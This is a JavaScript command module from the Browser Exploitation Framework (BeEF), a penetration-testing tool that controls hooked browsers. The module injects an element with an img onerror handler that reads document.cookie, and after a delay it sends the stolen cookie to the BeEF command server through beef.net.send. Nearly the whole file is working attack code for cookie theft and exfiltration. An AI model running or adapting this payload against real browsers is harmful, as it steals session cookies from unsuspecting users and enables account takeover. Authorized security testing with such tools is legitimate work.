//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var t = document.createElement('div');
  t.id = 'test';
  document.body.appendChild(t);
  var g = document.createElement('script');
  g.text = "document.getElementById(\"test\").innerHTML=\"<img src=1 onerror=result=document.cookie;>\""
  t.appendChild(g);
  setTimeout('beef.net.send(\'<%= @command_url %>\', <%= @command_id %>, result)', 2000)
});
